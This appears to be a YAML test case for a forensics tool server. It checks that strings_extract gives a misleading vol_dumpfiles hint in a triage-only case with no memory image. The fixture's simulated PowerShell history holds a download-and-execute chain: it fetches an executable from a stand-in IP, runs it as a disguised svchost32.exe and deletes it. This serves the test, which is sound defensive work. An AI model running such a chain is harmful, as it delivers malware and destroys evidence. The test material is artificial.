# Matrix case P1021-009: when the file is missing, strings_extract answers
# with the hint "Use vol_dumpfiles --pid <PID> to extract from memory."
# without looking at whether the case has a memory image, and writes the
# argument as a command-line option. vol_dumpfiles takes a required `image`
# (the memory image) and an integer `pid`, so a call made as the hint says is
# refused, and in a case with no memory image there is no image to give.
# Evidence: a triage collection of a Windows host (KAPE-style folder tree:
# the hosts file and a user's PowerShell history), no memory image. The file
# asked for was deleted from the Temp folder before collection.
case_id: P1021-009
problem: P1021
server: trudi
variant: trudi-88fbca7
commit: 88fbca78186b6a0ca40423cf5e37a9dc46ae051e
display: multi-call
level: mcp
realism: common
realism_ko: "`file_path`는 모델 인자다. 파일 목록이나 기록에 남은 삭제된 파일, 잘못 옮긴 경로를 모델이 넣는 일은 흔하고, 메모리 없이 디스크 이미지나 triage 수집물만 있는 사건도 흔하다."
coverage: full
summary: In a case with only a triage collection and no memory image, strings_extract on a deleted file answers "Use vol_dumpfiles --pid <PID> to extract from memory.", and vol_dumpfiles called as the hint says (pid only) is refused because its required image argument is missing.
summary_ko: "메모리 이미지 없이 triage 수집물만 있는 사건에서 삭제된 파일로 `strings_extract`를 부르면 `Use vol_dumpfiles --pid <PID> to extract from memory.`라고 안내한다. 안내대로 `pid`만 주어 `vol_dumpfiles`를 부르면 필수 인자 `image`가 없어 거부된다."
defect_ko: "이 서버는 파일이 없을 때 사건에 메모리 이미지가 있는지 보지 않고 `vol_dumpfiles`를 안내하며, 인자를 실제 도구의 형식(필수 `image`, 정수 `pid`)이 아닌 CLI 옵션 형태 `--pid <PID>`로 적는다. 메모리 이미지가 있을 때만, 실제 인자 형식으로 안내해야 한다. 모델은 안내를 따라 실행할 수 없는 호출을 하거나, 메모리에서 파일을 되살릴 수 있다고 잘못 안다."
setup_ko: "메모리 이미지가 없는 Windows triage 수집물(hosts 파일, PowerShell 기록)을 두고, 수집 전에 지워진 Temp 폴더의 실행 파일 경로로 `strings_extract`를 부른 뒤 안내대로 `vol_dumpfiles`를 부른다."
fixture:
- path: triage/WKS-0412/C/Windows/System32/drivers/etc/hosts
  text: "# Copyright (c) 1993-2009 Microsoft Corp.\r\n#\r\n# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.\r\n#\r\n# localhost name resolution is handled within DNS itself.\r\n#\t127.0.0.1       localhost\r\n#\t::1             localhost\r\n"
- path: triage/WKS-0412/C/Users/jdoe/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt
  text: "cd $env:TEMP\r\nInvoke-WebRequest -Uri http://203.0.113.7/u.exe -OutFile svchost32.exe\r\n.\\svchost32.exe -k netsvcs\r\nRemove-Item .\\svchost32.exe\r\n"
steps:
- tool: strings_extract
  note_ko: "결함 호출: 수집 전에 지워진 파일 경로로 문자열을 뽑는다"
  args:
    file_path: ${EVIDENCE}/triage/WKS-0412/C/Users/jdoe/AppData/Local/Temp/svchost32.exe
- tool: vol_dumpfiles
  note_ko: "안내를 따른 호출: 안내대로 `pid`만 준다(사건에 메모리 이미지가 없다)"
  args:
    pid: 4242
expect:
- step: 1
  note_ko: 메모리 이미지가 없는 사건인데 메모리에서 꺼내라고 CLI 옵션 형태로 안내한다
  contains: 'Use vol_dumpfiles --pid <PID> to extract from memory.'
- step: 2
  note_ko: 안내대로 부른 `vol_dumpfiles`는 필수 인자 `image`가 없어 거부된다
  regex: '(?s)vol_dumpfiles rejected its input.*\nimage\n\s+Missing required argument'
- step: 2
  is_error: true
  note_ko: 안내대로 부른 호출은 오류로 끝난다
